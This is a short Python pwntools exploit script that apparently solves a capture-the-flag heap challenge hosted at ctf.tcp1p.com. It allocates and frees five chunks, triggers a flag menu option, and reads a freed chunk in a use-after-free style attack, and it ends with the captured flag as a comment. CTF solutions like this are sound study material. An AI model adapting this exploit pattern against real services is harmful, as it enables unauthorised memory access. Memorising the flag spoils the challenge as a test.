```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")


context.binary = exe
p = remote('ctf.tcp1p.com', 4267)
# p = process([exe.path])


def add(idx, size, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'Size: ', str(size))
    p.sendlineafter(b'Content: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx))

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx))

def flag():
    p.sendlineafter(b'> ', b'4')


# gdb.attach(p, gdbscript = '''
# b*create+272
# b*delete+141
# b*view+205
# c
# ''')

# input()

add(1, 0x70, b'a'*8)
add(2, 0x70, b'a'*8)
add(3, 0x70, b'a'*8)
add(4, 0x70, b'a'*8)
add(5, 0x70, b'a'*8)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
flag()
show(1)

p.interactive()

# TCP1P{k4mu_m4kan_ap4_1ni_k0q_un1qu3_s3k4li_yh_k4kung_chef_0ma1good_r3cyle???}

```
